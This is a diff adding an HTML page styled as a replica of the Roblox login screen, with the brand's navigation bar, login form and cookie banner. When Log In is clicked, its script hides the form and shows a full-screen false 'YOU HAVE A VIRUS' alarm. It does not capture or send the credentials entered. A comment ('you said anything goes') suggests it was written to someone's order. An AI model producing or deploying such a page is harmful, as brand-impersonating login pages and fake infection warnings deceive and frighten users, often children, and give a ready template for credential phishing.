@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Roblox Login Replica</title>
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background-color: #121217;
+    color: white;
+  }
+  nav {
+    display: flex;
+    align-items: center;
+    background-color: #121217;
+    padding: 10px 24px;
+    border-bottom: 1px solid #2a2a35;
+  }
+  .logo {
+    font-weight: bold;
+    font-family: 'Arial Black', Arial, sans-serif;
+    font-size: 20px;
+    margin-right: 20px;
+    color: white;
+  }
+  nav a {
+    color: white;
+    text-decoration: none;
+    margin-right: 24px;
+    font-size: 14px;
+  }
+  nav a:last-child {
+    margin-right: 0;
+  }
+  .search-container {
+    flex-grow: 1;
+    position: relative;
+  }
+  .search-container input[type="search"] {
+    width: 100%;
+    padding: 6px 12px;
+    border-radius: 16px;
+    border: none;
+    background-color: #1f1f28;
+    color: white;
+  }
+  .signup-btn {
+    background-color: #007bff;
+    border: none;
+    color: white;
+    padding: 8px 16px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 14px;
+  }
+  .container {
+    display: flex;
+    justify-content: center;
+    padding: 80px 0;
+  }
+  .login-box {
+    background-color: #1e1e26;
+    padding: 32px 32px 40px 32px;
+    border-radius: 8px;
+    width: 360px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.6);
+  }
+  .login-box h1 {
+    font-size: 24px;
+    font-weight: bold;
+    margin-bottom: 24px;
+  }
+  .login-box input {
+    width: 100%;
+    background-color: #27272f;
+    border: none;
+    border-radius: 8px;
+    padding: 12px 16px;
+    margin-bottom: 12px;
+    color: white;
+    font-size: 14px;
+  }
+  .login-btn {
+    width: 100%;
+    padding: 12px 16px;
+    background-color: transparent;
+    border: 1px solid white;
+    border-radius: 8px;
+    color: white;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    margin-bottom: 16px;
+    transition: background-color 0.3s;
+  }
+  .login-btn:hover {
+    background-color: #4a4a55;
+  }
+  .link-text {
+    font-size: 14px;
+    text-align: center;
+    margin-bottom: 24px;
+  }
+  .link-text a {
+    color: white;
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .secondary-btn {
+    width: 100%;
+    padding: 12px 16px;
+    background-color: #3a3a47;
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    margin-bottom: 12px;
+  }
+  footer {
+    background-color: #121217;
+    color: #ccc;
+    font-size: 12px;
+    padding: 20px 40px;
+    border-top: 1px solid #2a2a35;
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+  }
+  footer a {
+    color: white;
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .cookie-buttons {
+    margin-top: 12px;
+  }
+  .cookie-buttons button {
+    background-color: #22222a;
+    border: none;
+    color: white;
+    padding: 8px 16px;
+    margin-right: 8px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-weight: 600;
+    font-size: 12px;
+  }
+  .cookie-buttons button:last-child {
+    background-color: white;
+    color: black;
+  }
+  /* Fullscreen virus message */
+  #virusMessage {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background-color: black;
+    color: red;
+    font-size: 48px;
+    font-weight: 900;
+    text-align: center;
+    padding-top: 20vh;
+    z-index: 9999;
+    user-select: none;
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="logo">ROBLOX</div>
+  <a href="#">Charts</a>
+  <a href="#">Marketplace</a>
+  <a href="#">Create</a>
+  <a href="#">Robux</a>
+  <div class="search-container">
+    <input type="search" placeholder="Search" />
+  </div>
+  <button class="signup-btn">Sign Up</button>
+</nav>
+
+<div class="container" id="loginContainer">
+  <div class="login-box">
+    <h1>Login to Roblox</h1>
+    <input id="username" type="text" placeholder="Username/Email/Phone" />
+    <input id="password" type="password" placeholder="Password" />
+    <button class="login-btn" id="loginBtn">Log In</button>
+
+    <div class="link-text">
+      <a href="#">Forgot Password or Username?</a>
+    </div>
+
+    <button class="secondary-btn">Email Me a One-Time Code</button>
+    <button class="secondary-btn">Use Another Device</button>
+
+    <div class="link-text">
+      Don't have an account? <a href="#">Sign Up</a>
+    </div>
+  </div>
+</div>
+
+<footer>
+  We use cookies to personalize and enhance your experience on our site. Visit our <a href="#">Privacy Policy</a> for more information on our data collections practices. By clicking Accept, you agree to our use of cookies for the purposes listed in the settings. To see a complete list of the companies that use these cookies and other technologies and to tell us whether they can be used on your device or not, access our Cookie Consent Tool. Your will see this message only once, but you will always be able to set your preferences at any time in the Cookie Consent Tool.
+  <div class="cookie-buttons">
+    <button>Decline All</button>
+    <button>Accept All</button>
+  </div>
+</footer>
+
+<div id="virusMessage">
+  YOU HAVE A VIRUS<br/>
+  CLOSE THIS DOWN!
+</div>
+
+<script>
+  document.getElementById('loginBtn').addEventListener('click', function() {
+    // You could optionally check inputs here, but you said anything goes
+    // Hide login container and show virus message
+    document.getElementById('loginContainer').style.display = 'none';
+    document.getElementById('virusMessage').style.display = 'block';
+  });
+</script>
+
+</body>
+</html>
